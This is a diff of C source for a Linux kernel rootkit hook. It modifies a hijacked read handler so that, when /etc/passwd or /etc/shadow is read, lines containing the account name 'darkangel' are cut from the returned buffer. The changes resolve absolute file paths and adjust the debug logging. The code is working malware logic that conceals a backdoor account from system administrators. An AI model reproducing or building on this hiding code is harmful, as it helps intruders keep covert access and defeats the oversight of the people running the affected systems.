@@ -87,8 +87,8 @@ my_read(unsigned int fd, char *buf, size_t count) {
 	
 	char* file_name, file_parent;
 	char *ptr1, *ptr2, *ptr3;
-	char *passwd = "passwd";
-	char *shadow = "shadow";
+	char *passwd = "/etc/passwd";
+	char *shadow = "/etc/shadow";
 	char *hide_str = "darkangel";	// ptr2
 	char *delimiter = "\n";	// ptr3
 	int i, buf_len_to_copy;
@@ -96,29 +96,32 @@ my_read(unsigned int fd, char *buf, size_t count) {
 	struct kstat file_ksp;
 	r = vfs_stat(file, &file_ksp);
 	file_inode = file_ksp.ino;
-	file_dev = file_ksp.dev;
-	file_mode = file_ksp.mode;
-	file_size = file_ksp.size;
-	//char* abs_path;
+	//file_dev = file_ksp.dev;
+	//file_mode = file_ksp.mode;
+	//file_size = file_ksp.size;
+	char* abs_path;
+	char *tmp;
 	
 	struct nameidata nd;
-	struct path *file_path;
+	struct path file_path;
 	
 	if (file) {
-		file_name = file->f_path.dentry->d_name.name;
-		//file_parent = file->f_dentry->d_parent->d_name.name;
-		vfs_path_lookup(file->f_dentry, file->f_vfsmnt, passwd, LOOKUP_ROOT, file_path);
-		//printk("filename: %s\n", file_name);
+		//file_name = file->f_path.dentry->d_name.name;
+		file_path = file->f_path;
+		path_get(&file->f_path);
+		tmp = (char *)__get_free_page(GFP_TEMPORARY);
+		abs_path = d_path(&file_path, tmp, PAGE_SIZE);
+		path_put(&file_path);
+		free_page((unsigned long)tmp);
+		
 		loff_t pos = file->f_pos;
 		
-		if((strcmp(file_name, passwd) == 0 || strcmp(file_name, shadow) == 0) && strlen(buf) > 0) {
+		if((strcmp(abs_path, passwd) == 0 || strcmp(abs_path, shadow) == 0) && strlen(buf) > 0) {
 			//abs_path = dentry_path(file->f_path.dentry, file_name, strlen(file_name));
 			
-			printk("filename(%s): %s, inode: 0x%x\n", file_path, file_name, file_inode);
-			printk("dev: 0x%x, mode: 0x%x, size: 0x%x\n", file_dev, file_mode, file_size);
-			printk("[FD]: 0x%x, [count]: 0x%x, [Org_Buf_Size]:0x%x\n", fd, count, strlen(buf));
-			
-			printk("[!!!!!] pos: 0x%x\n", pos);
+			printk("READ: %s with inode 0x%x\n", abs_path, file_inode);
+			//printk("[FD]: 0x%x, dev: 0x%x, mode: 0x%x, size: 0x%x\n", fd, file_dev, file_mode, file_size);
+			printk("[Org_Buf_Size]:0x%x\n", strlen(buf));
 			
 			ptr1 = buf;
 			ptr2 = strstr(buf, hide_str);
@@ -132,7 +135,6 @@ my_read(unsigned int fd, char *buf, size_t count) {
 			
 			//memcpy(ptr2, ptr3, buf_len_to_copy);
 			
-			
 			ptr3++;
 			for (i = 0; i < buf_len_to_copy; i++)
 				*ptr2++ = *ptr3++;
@@ -142,10 +144,9 @@ my_read(unsigned int fd, char *buf, size_t count) {
 			ret = vfs_read(file, buf, strlen(buf), ptr1);
 			//file->f_pos = pos;
 			
-			printk("[!!!!!] pos2: 0x%x\n", file->f_pos);
-			return ret;
 			printk("[End_Buf_Size]: 0x%x\n", strlen(buf));
 			printk("%s\n", buf);
+			return ret;
 		}
 		
 		ret = vfs_read(file, buf, count, &pos);
